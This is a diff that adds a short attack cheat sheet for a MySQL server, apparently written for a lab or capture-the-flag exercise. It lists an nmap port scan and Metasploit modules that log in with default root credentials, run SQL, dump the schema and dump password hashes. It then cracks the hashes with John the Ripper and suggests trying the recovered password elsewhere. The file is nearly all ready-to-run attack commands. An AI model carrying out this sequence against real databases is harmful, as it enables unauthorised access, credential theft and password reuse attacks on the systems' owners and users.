@@ -1,0 +1,32 @@
+# do a port scan
+nmap -sT -p- -sA <target_ip>
+
+# metasploit commands
+
+# enumeration
+msfconsole
+search mysql_sql
+use auxiliary/admin/mysql/mysql_sql
+options
+set rhosts <target_ip>
+set username root
+set password password
+exploit -z
+set sql "show databases"
+
+# exploitation
+search mysql_schemadump
+use auxiliary/scanner/mysql/mysql_schemadump
+options
+setg username root
+setg password root
+exploit -z
+search mysql_hashdump
+use auxiliary/scanner/mysql/mysql_hashdump
+options
+exploit -z
+
+#save the hash of an unusual user to hash.txt
+#run john
+john hash.txt
+# there may be a password re-use try and use it in other scenarios
